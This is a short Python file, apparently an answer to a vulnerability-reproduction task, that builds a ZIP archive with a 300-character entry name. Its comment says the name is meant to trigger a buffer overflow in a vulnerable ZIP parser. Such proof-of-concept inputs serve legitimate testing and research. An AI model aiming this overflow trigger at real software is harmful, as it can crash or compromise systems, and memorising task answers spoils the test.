import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf = io.BytesIO()
        long_name = "A" * 300  # >256 to trigger the overflow in vulnerable version
        with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_name, b"")
        return buf.getvalue()